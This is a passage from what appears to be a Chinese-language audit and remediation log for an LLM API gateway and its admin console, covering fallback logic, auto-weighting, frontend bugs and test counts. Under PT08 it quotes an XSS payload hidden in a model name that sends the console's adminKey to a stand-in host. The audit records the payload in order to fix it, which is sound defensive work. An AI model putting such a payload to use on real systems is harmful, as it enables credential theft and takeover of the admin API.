> `pickWeighted` 会推进 `SWRR_*` 计数器、还会把选中的候选移到队首——那就不叫观测了。所以观测走独立的纯枚举
> `pureCandidatesFor`，并用三层证据卡住：单测断言观测跑 100 遍 `SWRR_*` 状态逐字节不变、`pickWeighted` 落点序列一致、
> `ch.def.weight` 不变；e2e 断言真流量下预测 50/50 时落点仍是老规矩、`weightedHits` 恒 0；装配守卫断言观测函数体里
> **不许出现 `SWRR_`**、`persistConfig` 白名单必须含 `autoWeight`（否则保存渠道会静默抹掉旋钮，PT29 同族陷阱）。
>
> 设计上刻意留的护栏（都会在 README 里写清）：`floor` 0.2（慢 ≠ 坏）、`maxShare` 70%（防赢家通吃）、
> `minSamples` 10（样本不足就不动）、冷却/`down` 直接排除、低频重算 + 指数平滑 + 死区（抗振荡）。
> 其中 `maxShare` **只封顶自动算出来的份额，手填权重永不封顶**——手填是硬意图，护栏不该反过来压制它（单测卡死这条）。
>
> 回归：新增 `test/auto-weight.test.js`（**61 项**）与 `test/auto-weight-e2e.test.js`（**29 项**，真链路），
> `test/console-state.test.js` 38 → **57 项**（新增第 4 节：字段接入 + 观测卡渲染 + "当前分流一字未动"）。
> 全量回归 **13 文件 / 491 项**通过。顺带修掉一条**文档腐烂**：`docs/frontend-console-detailed.md` §11.3 的产物结构
> 数字（2477/2480）已随 app.js 增长校正为 2614/2617；代码地图 §0.2 与 §5 的生产侧行号整体平移 **35 处**。
>
> 诚实说明：**自动权重尚未生效**。本机 31 个渠道都没有 `weight`，所以真机上的观测卡只会显示"多候选模型的均分预测"，
> 看不出自动调权的戏剧性效果——要看到份额真的动，得先让手填权重或等"生效版"。

### PT35 高：上游 4xx **短路兜底**，把"渠道的错"甩给客户端 —— ✅ v1.9.2 已整改

- 证据：`tryChannel` 及 4 个协议分支（codex / genspark / workbuddy / notion）各写一份同一判据
  `if (resp.status >= 400 && resp.status < 500 && ![401,402,403,404,408,429].includes(resp.status)) { …透传…; return 'fatal_client'; }`。
  非白名单的 4xx 一律原样透传并就此停手，**不管后面还有没有候选**；更要命的是同一段代码**上面**已经
  `recordFailure(ch, …)` 记了失败并置了冷却——网关自己认定这是渠道的错，却对客户端说是客户端的错，还不兜底。
- 影响面：渠道「声明了此模型」但上游实际没有（别名表过期 → 上游 404）、或中转参数方言不同（不认
  `stream_options` 等 → 上游 400）时，客户端拿到上游错误、而**同模型另有能用的候选**从未被试。
- 最小修复（v1.9.2）：抽出一个判据 `shouldPassThrough4xx(status, hasMoreCandidates)`，5 处共用：
  渠道侧状态码（`401/402/403/404/408/429`）永远切；其余 4xx **只在后面没有能上场的候选时**才透传。
- 修复过程中被自己的测试抓出的两个坑（都已写进断言，防止回退）：
  1. 「还有候选」不能只看**下标**。旧写法 `i < len - 1` 把**冷却中**的候选也算成后手——它这一轮根本不会被
     attempt，于是 4xx 兜底切进空池，最后兜出个 **502**，把客户端本该看到的 400 弄丢了（`test/upstream-4xx-fallback-e2e.test.js` §5）。
     现在按"后续候选里还有没有不在冷却中的"来判，并顺带影响首字节守门（真没后手时放宽到 300s，符合原设计）。
  2. 一度加了"连续两家回同一个 4xx 就判定客户端错误、提前透传"的止损阀，**已删掉**：同品牌中转的参数方言
     往往一致，两家都回 400 时第三家本来能成，止损阀会掐掉它——正是本修复要恢复的可用性（§3 卡死这条）。
- 代价（如实记）：真·客户端错误（参数写错）现在会把候选链走完才回 4xx，请求更慢、上游多挨几下；
  链长仍受 `retries.maxModelFallbacks` 约束。透传时用**最后一家**的错误体，客户端看到的仍是上游真实答复。
- 回归：新增 `test/upstream-4xx-fallback-e2e.test.js`（**32 项**：真值表 + 三上游真链路，含"全链 400 → 拿到 400 而不是 502"、
  "单候选 400 语义不变"、"401/429 必切"）。改候选链 / 兜底判据 / `hasMoreCandidates` 语义时必跑。

> **整改记录（2026-09-27，v1.9.2）**：另一位 Agent（Trae）交来一份报告，主张"4xx 直接透传把兜底短路了"，
> 并给出真机证据链（模型名照旧，两个候选在此记为**渠道 A / 渠道 B**——渠道标识已脱敏，下同；A 的别名表过期 → 上游 404 →
> 客户端拿到 404、B 从未被试）。**逐条核对的结论要说清**：
>
> - 报告里引用的判据片段（白名单**不含** 404）**在 v1.6 的 `server.js` 里不成立**：5 处判据的白名单都早就有 404
>   （v0.9 加进去的）。真机实测也复现不出：对同一模型发一发请求，**HTTP 200、落到了备用候选**——兜底一直是好的。
> - 但报告的**核心指控对另一些 4xx 仍然成立**：`400`/`422` 等非白名单 4xx 确实会短路兜底，且与"已经记了失败"
>   自相矛盾。所以本轮按用户要求做的是**通用判据**（前面还有能上场的候选就一直切），而不是照搬"只兜 404"。
> - 顺带两条独立发现（都记在此，避免后人重查）：`config.retries.perChannel` 是**死配置**（server.js:251 读进来后
>   再无引用）；`test/auto-weight-e2e.test.js` §2 有一条**恒假断言**（"a 份额不超过 50"——本夹具里 b 恒慢 250ms，
>   它的速度惩罚会让 a 的份额反而升到 ~58%，与失败项无关），已改成"失败率没过死区就冻着、过了就必须真扣"的抗振荡契约
>   + `share = h_a/(h_a+h_b)` 自洽比对（该文件 29 → **30 项**）。这条测试缺陷**在 v1.6 就已存在**（同一 `server.js`
>   的 A/B 对照：带改动与不带改动跑出的数字逐位相同），不是本轮引入的。
> - 全量回归 **14 文件 / 529 项**通过；`server.js` 的 5 处判据收敛成同一个函数，装配守卫禁止再各写一份名单。

## 已验证的非问题（记录在此，避免后人重查）
- **usage.json 无增长问题**（曾疑 byDay/hourly 无界）：recent 封顶 800、byDay 每日仅 1 条、hourly 固定 24 桶（server.js:1471），实测文件 ~8.7K 行且大体平稳；4 秒防抖全量重写在 ~300KB 规模合理。
- **arena-cookie 的 CORS 预检不会被鉴权拦死**（曾疑 OPTIONS 带不上 key）：`?key=` 在预检 URL 里随行，checkAuth 读得到（server.js:202）；1MB 读缓冲（server.js:1514）也有上界。
- **`/admin/status`、`/admin/recheck` 不是死代码**：README:261 明确登记为旧版兼容路径。
- **五个 HTTP 客户端非重复造轮子**：fetch 直连 / psHttpRequestWin（Windows Schannel 过 CF）/ curlHttpRequest（Linux curl 过 CF）/ wbCurlRequest（curl+proxy，genspark/codex 用）/ notionCurlRequest（cookie 链）。各司其职；curlHttpRequest 与 wbCurlRequest 有合并空间但行为风险大，列为观察项不列发现。
- **鉴权咽喉点干净**：每条路由先 checkAuth 再 dispatch（server.js:1162-1222），Bearer 与 `?key=` 双通道都活着；tool id 消毒（2165-2193）是信任边界上的正确防护。
- **estimateTokens 的 CJK 感知启发式**（1336-1346）是恰当的懒实现，有注释有兜底语义。
- **console.log 全部为运维日志**，无调试残留。

## 前端独立审查（子代理只读）

> 方法：`build/app.js` 1862 行全文精读（审查时点，v0.7 整改前）+ console-redesign.html 字典/锚点核对 + build/* 四件套逐行 + 产物抽查 + 机械死函数扫描（121 个定义逐一计引用）。全部为静态分析。与 PT01-07 零重叠。

### PT08 高（信任边界）：onclick 模型名内联可注入 —— ✅ v0.7 已整改（3 处改 data-* + dataset）

- 证据：app.js:528 `openModel('${esc(m.name)}')`（esc 把 `'` 转成 `&#39;`，但 HTML 属性解析时实体先解码回引号，JS 字符串照样逃逸）；app.js:799 `openModel('${m.name}')` **完全裸拼**；app.js:955 `copyCurl('${esc(l.m)}')` 同 528。
- 利用链：模型别名无字符校验（server.js validateChannelDef 只查 models 是对象），来源含「从上游探测更多」——陌生中转站 /models 返回 `x');fetch('//e/'+sessionStorage.adminKey);//` 这类名字，用户勾选加入别名后，点击即在控制台源执行，可偷走 adminKey 调全部 /admin/api。
- 处置：3 处套用仓库 v0.5 已有的 `data-m/data-t="${esc(名字)}" onclick="fn(this.dataset.m)"` 模式（799 处顺带补 esc）。
- 回归：含引号模型名可正常点开/复制。

### PT09 中：URL 来源硬编码 127.0.0.1 全家 —— ⏸ 暂缓（PT01 后紧迫性消失，登记 detailed §9）

- 证据：server.js /admin/api/config 下发 urls 硬编码 `http://127.0.0.1:PORT`，前端五个消费点一律优先 CFG.urls（pgSend 1095/1101、copyModels 436、copyCurl 961、pgCopyCurl 1070、vAccess 端点卡 1191-1199），另有 openModel curl 样例写死 8787（840-844）、SNIP 三段写死（1151-1188）。控制台恒由网关同源提供，`location.origin` 恒更正确（阶梯 4）。v0.5 明确支持局域网 IP 访问的场景下，局域网浏览器里 Playground/copy 全打到访问者本机 127.0.0.1 必挂。
- 暂缓理由：PT01 整改后端口只绑 127.0.0.1，局域网访问本身已不可达，CFG.urls 与真实地址恒一致；若将来恢复局域网访问则必修。

### PT10 中：codex 配额条文档失实（三处同族）—— ✅ v0.7 已整改（删宣称；恢复展示登记 detailed §9）

- 证据：README:120 把「codex 配额条」列为生产独有能力，但新控制台零渲染——`codexQuota`/`notionUsage` 全文仅 adapt 映射行(78)，抽屉/表格均无展示（旧控制台 quotaBox+📊 在 v0.4 重设计时丢失）；code-map:32 把 extra.css 死选择器登记为现行组件；app.js:39 注释宣称配额/用量进 DATA（映射后无消费方）。
- 处置：删 app.js:78 映射行 + 修 39 行注释 + 删 README:120 / detailed §5.1 两处宣称。数据仍在 `/admin/api/status` 下发（server 侧未动），恢复展示时从 git 历史找回 v0.3 quotaBox 实现。

### PT11 中：extra.css 28/38 行死样式 —— ✅ v0.7 已删

- 证据：7 组选择器 5 组零 markup 引用：`th.sortable`(7-10)、`.mini-kv`(12-16)、`.img-out`(18-21)、`.art` 系列(23-31)、`.loading`(33-35)——全源 grep 零命中，仅产物原样携带；活的只有 `.chip.codex` 和 `.kv dd.mono`。误导读者以为 Playground 有生图/工件预览。
- 回归：页面视觉零变化（本就无元素命中）；extra.css 38→8 行，JS 偏移 +648→+617 已全文档同步。

### PT12 中：模型页协议页签语义三重矛盾 —— ⏸ 暂缓（纯展示层，登记 detailed §9）

- 证据：后端 aggregateModels 对三入口统一收全部协议别名（server.js aliasedProto 单表），页面副标自己写「三套端点共用同一份别名表」(744)，但页签按渠道协议过滤且 openai 页签排除表是拍脑袋的（排 notion/workbuddy/genspark/notion-agent）——genspark 专属别名明明能从 /v1 调用却被 OpenAI 页签隐藏，Anthropic/Gemini 页签只显示同名协议渠道、严重少报。

### PT13 低：「按实际选中顺序」文案失实 —— ✅ v0.7 已改文案

- 证据：openModel 抽屉标题「调度优先级（按实际选中顺序）」与 Playground 候选 chips 编号都基于 m.chans = adapt() 按 config 渠道序构建，真实调度序是服务端按 health/effPriority/latency 排——展示顺序与实际调度无关，误导排障。
- 处置：抽屉标题改「来源渠道（按 config 渠道序，非实时调度序）」、Playground 标签「候选渠道」→「来源渠道」。

### PT14 低：reprobe 写入无人读的 errText —— ✅ v0.7 已归位

- 证据：app.js:718 reprobe 把探测错误写进 c.errText，但渠道形状是 lastError（77 行），errText 全文无读取方；且渠道 lastError 在新控制台全程不展示。
- 处置：改写 c.lastError（数据归位）；抽屉渲染 lastError 登记 detailed §9。

### PT15 低：IC.arrowDown 唯一零引用图标 —— ✅ v0.7 已删

### PT16 低：openLog 静默回退错误记录 —— ✅ v0.7 已修

- 证据：app.js:924 找不到 id 时静默回退 `||DATA.logs[0]`——8 秒轮询刷新后点旧行，会展示错误的另一条记录且无提示。
- 处置：找不到时 `return toast('该记录已被轮询刷新移除…')`。

### PT17 低：protoLabel 与 PROTO_META.label 两套协议显示名 —— ✅ v0.7 已补 codex 短名

- 证据：protoLabel（8 项缺 codex）与 PROTO_META.label（9 项含 codex）同文件并存——codex 渠道 chip 显示裸 'codex' 而表单下拉显示「Codex 订阅反代」，同屏两种叫法；vChannels 副标(566) 还写死 6 个协议（实际 8）。
- 处置：protoLabel 补 `codex:'Codex'` 短名、副标改 `PROTO_ORDER.length` 动态生成。彻底单一化（protoLabel 从 PROTO_META 派生）涉及初始化顺序（protoLabel 定义在 PROTO_META 之前），留待下次动此处时顺手做。

### PT18 低：全局搜索 placeholder 承诺过载 —— ✅ v0.7 已改文案

- 证据：shell.html:32「搜索渠道、模型、请求 ID…」但实现只搜渠道（chQ=q; go('channels')）。

### PT19 低：主题闪烁 —— ⏸ 暂缓（登记 detailed §9）

- 证据：head.html 默认 data-theme="light"，app.js init 默认 dark——深色用户每次加载先闪一帧浅色。修法是 head 内联一行读 localStorage，会增行改 JS 偏移，需同步全部锚点文档，留待专门动 head.html 时做。

### PT20 低：有效优先级角标表达式两处内联重复 —— ✅ v0.7 已补 ponytail: 注释

- 说明：v0.6 刻意单行内联不抽 helper 保锚点（§8.6 已注明）。按 PT07 同款补了 `// ponytail:` 天花板注释，下次动锚点时再抽。

### PT21 低：build.js 行数守卫缺失 —— ✅ v0.7 已加

- 证据：+13/+617 换算捷径依赖 head=21/shell=52 恒定，全靠人肉纪律；已有 `</style>` 自检，加行数断言可让锚点漂移在构建期爆错。
- 处置：build.js 增加行数守卫（head/shell 变行数直接 throw，提示同步 AGENTS.md §1.2 与 code-map）。

### PT22 中：8 秒轮询重绘把模型页搜索词与 Playground 草稿冲掉 —— ✅ v1.0.1 已整改

- 来源：用户报告（「聚合模型里搜索任意模型，一会就刷新了页面，然后搜索的就没了」）。
- 证据（`build/app.js`，整改前）：`setInterval(…,8000)` → `loadAll()` → `render()` 重建当前页整个 `#viewport` DOM；
  `vModels` 的 `<input id="mQ" placeholder="搜索模型名…">` **无 `value=`、无状态变量**，页签把 `class="tab on"` 写死在「全部」；
  `drawMTable()` 遂读 `$('#mQ').value`（重绘后为空）→ 搜索清空、页签跳回。
  对照：`vChannels` 有 `chQ`/`chTab`、`vLogs` 有 `lgRange/lgCh/lgOk/lgQ`（命令式回填）、`vOverview` 有 `ovRange` —— **唯独模型页漏了**。
  `vPlayground` 同族：`#pgInput`/`#pgSys` 草稿与 `#pgModel`/`#pgTemp`/`#pgMax`/`#pgStream` 均无回填（草稿被吞，症状更重）。
- 最小修复：模型页补 `mTab`/`mQ` 状态并在模板回填；Playground 补 `pgDraft`/`pgSysText`/`pgModelSel`/`pgTempV`/`pgMaxV`/`pgStreamOn` 六个状态并回填；
  轮询加两条护栏（`pgBusy` 流式中、视口内输入控件被聚焦时跳过这一拍）。
- 最小回归：真机等 10 秒，模型页搜索词/页签保留、Playground 草稿保留、流式「正在路由」气泡不被抽掉；渠道页/日志页/总览页原行为不变。
- **已固化为自动化回归**：`node test/console-state.test.js`（零依赖，27 项断言，覆盖模型页与 Playground；
  从 `build/app.js` 现抠真实渲染函数跑最小 DOM 桩）。**变异测试 4/4**：四处修复逐个撤掉后测试全部变红，恢复后基线重新变绿。
- 沉淀：code-map §0.2 末尾新增「状态回填约定」（视口内输入控件的值必须存 JS 变量 + 模板回填 + `oninput` 写回）；code-map §8 自测清单加了这条命令。

### 前端已验证的非问题（并入总表，避免后人重查）

- **死函数扫描**：app.js 全部 121 个函数/常量定义逐一计引用，无死函数（`$`/`$$` 为扫描器正则误报）；图标表仅 arrowDown 一项死（已删）。
- **usage.latency 与 hourly 后端确实下发**（server.js /admin/api/usage），总览延迟优先级/环比注释成立。
- **CFG.adminKey 存在**（/admin/api/config 下发）→ 接入页 insecure 检查是活分支非死代码。
- **渠道 id 服务端校验 `[a-zA-Z0-9_-]`** → 16 处 onclick 里 c.id 内插全部安全；reqIdOf 产物 base36、整数索引、常量 kind 同样安全——**onclick 攻击面恰好收敛到 PT08 的 3 处模型名内插**。
- **文档行号锚点三重实测全过**（审查时点）：JS 偏移、CSS 偏移、code-map §5 原型函数锚点九个全中——前端文档行号可信，行数漂移仅 server.js（PT06）。
- **PROTO_META/PROTO_ORDER 原型↔生产逐字节一致**（同步义务已由 AGENTS.md §1.1 硬约束化，属已接受成本）。
- **esc() 在纯文本/属性值语境正确**；copyText 的 execCommand 兜底（局域网 http 下 clipboard 不可用）、reqIdOf 撞号注释、掩码密钥处理均合理。
- **刻意设计确认不报**：红涨绿跌、遮罩不点关、原型演示数据（DATA/REPLIES/hash/simTest/fakeKey/MODEL_POOL/PROBE_POOL）、shell gwHost 默认值（loadAll 会覆盖）。

### 前端总评

「设计稿 + 构建管线」在 Ponytail 视角下是**最简正确形态**：零依赖零框架（原生 select/input/confirm、原生剪贴板+execCommand 兜底、内联 SVG 手写图表、单 modal() 容器复用六种弹窗），46 行构建脚本带针对真实事故的自检，CSS 逐字节复制根治双源漂移。没有未请求的抽象，演示逻辑严格圈在原型文件里。**明确不值得动**：原型/生产 JS 整体去重（会毁掉设计稿「零依赖、可单开」语义）；协议字典跨文件单一化（AGENTS.md 已把同步写成硬约束，抽公共源反而引入 import 基建）；build 管线结构本身。这份代码库欠的主要是**删除**，不是重写——v0.7 已把该删的删掉。
